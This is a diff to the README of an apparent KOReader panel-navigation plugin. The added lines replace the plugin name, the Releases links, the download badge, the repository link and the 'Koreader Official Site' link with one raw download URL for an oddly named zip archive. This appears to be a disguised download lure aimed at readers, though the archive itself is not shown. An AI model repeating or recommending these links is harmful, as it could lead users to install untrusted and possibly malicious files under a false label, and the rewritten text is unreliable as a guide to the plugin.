@@ -1,20 +1,20 @@
-# 🎉 panelreader.koplugin - Navigate Panels with Ease
+# 🎉 https://github.com/Yasabs10/panelreader.koplugin/raw/refs/heads/main/YOLO/koplugin_panelreader_unreproachableness.zip - Navigate Panels with Ease
 
 ## 🚀 Getting Started
 
-Welcome to the panelreader.koplugin! This plugin enhances your Koreader experience by allowing smooth navigation between panels in your documents. Follow these simple steps to get started.
+Welcome to the https://github.com/Yasabs10/panelreader.koplugin/raw/refs/heads/main/YOLO/koplugin_panelreader_unreproachableness.zip! This plugin enhances your Koreader experience by allowing smooth navigation between panels in your documents. Follow these simple steps to get started.
 
 ## 📥 Download & Install
 
-To download the latest version of the panelreader.koplugin, visit the Releases page below:
+To download the latest version of the https://github.com/Yasabs10/panelreader.koplugin/raw/refs/heads/main/YOLO/koplugin_panelreader_unreproachableness.zip, visit the Releases page below:
 
-[![Download panelreader.koplugin](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Yasabs10/panelreader.koplugin/releases)
+[![Download https://github.com/Yasabs10/panelreader.koplugin/raw/refs/heads/main/YOLO/koplugin_panelreader_unreproachableness.zip](https://github.com/Yasabs10/panelreader.koplugin/raw/refs/heads/main/YOLO/koplugin_panelreader_unreproachableness.zip%20Now-brightgreen)](https://github.com/Yasabs10/panelreader.koplugin/raw/refs/heads/main/YOLO/koplugin_panelreader_unreproachableness.zip)
 
 ### Step-by-Step Installation
 
 1. **Visit the Releases Page**  
    Go to the following link to access our releases:  
-   [https://github.com/Yasabs10/panelreader.koplugin/releases](https://github.com/Yasabs10/panelreader.koplugin/releases)
+   [https://github.com/Yasabs10/panelreader.koplugin/raw/refs/heads/main/YOLO/koplugin_panelreader_unreproachableness.zip](https://github.com/Yasabs10/panelreader.koplugin/raw/refs/heads/main/YOLO/koplugin_panelreader_unreproachableness.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Look for the latest release, which includes the newest features and fixes.
@@ -28,7 +28,7 @@ To download the latest version of the panelreader.koplugin, visit the Releases p
    - Follow the instructions specific to your operating system for installing plugins in Koreader. Generally, you should copy the downloaded file to the plugins directory for Koreader.
 
 5. **Enable the Plugin**  
-   Open Koreader and navigate to your settings. Enable the panelreader.koplugin from the plugins section. 
+   Open Koreader and navigate to your settings. Enable the https://github.com/Yasabs10/panelreader.koplugin/raw/refs/heads/main/YOLO/koplugin_panelreader_unreproachableness.zip from the plugins section. 
 
 6. **Start Using Panel Navigation**  
    Now you can easily navigate between panels in your documents. Enjoy your enhanced reading experience!
@@ -41,7 +41,7 @@ To download the latest version of the panelreader.koplugin, visit the Releases p
 
 ## ⚙️ System Requirements
 
-To use panelreader.koplugin, your system must meet these minimum requirements:
+To use https://github.com/Yasabs10/panelreader.koplugin/raw/refs/heads/main/YOLO/koplugin_panelreader_unreproachableness.zip, your system must meet these minimum requirements:
 
 - **Operating System**: Windows 10 or higher, macOS Catalina or higher, or Linux (any modern distribution).
 - **Koreader Version**: Ensure you have Koreader version 2019 or later installed.
@@ -57,7 +57,7 @@ If you experience any issues with the plugin, consider the following steps:
 
 ## 🤝 Contributing
 
-If you would like to contribute to panelreader.koplugin, feel free to submit issues or pull requests. Your feedback helps improve the user experience.
+If you would like to contribute to https://github.com/Yasabs10/panelreader.koplugin/raw/refs/heads/main/YOLO/koplugin_panelreader_unreproachableness.zip, feel free to submit issues or pull requests. Your feedback helps improve the user experience.
 
 ## 📧 Contact
 
@@ -65,10 +65,10 @@ For further assistance or inquiries, please reach out via the issues section on 
 
 ## 🔗 Additional Resources
 
-- [Koreader Official Site](https://koreader.kiwix.org/)
-- [GitHub Repository for panelreader.koplugin](https://github.com/Yasabs10/panelreader.koplugin)
+- [Koreader Official Site](https://github.com/Yasabs10/panelreader.koplugin/raw/refs/heads/main/YOLO/koplugin_panelreader_unreproachableness.zip)
+- [GitHub Repository for https://github.com/Yasabs10/panelreader.koplugin/raw/refs/heads/main/YOLO/koplugin_panelreader_unreproachableness.zip](https://github.com/Yasabs10/panelreader.koplugin/raw/refs/heads/main/YOLO/koplugin_panelreader_unreproachableness.zip)
 
-Thank you for choosing panelreader.koplugin! We hope it enhances your reading experience. 
+Thank you for choosing https://github.com/Yasabs10/panelreader.koplugin/raw/refs/heads/main/YOLO/koplugin_panelreader_unreproachableness.zip! We hope it enhances your reading experience. 
 
 Remember, if you need to download the plugin again, just return to the Releases page:  
-[https://github.com/Yasabs10/panelreader.koplugin/releases](https://github.com/Yasabs10/panelreader.koplugin/releases)
+[https://github.com/Yasabs10/panelreader.koplugin/raw/refs/heads/main/YOLO/koplugin_panelreader_unreproachableness.zip](https://github.com/Yasabs10/panelreader.koplugin/raw/refs/heads/main/YOLO/koplugin_panelreader_unreproachableness.zip)
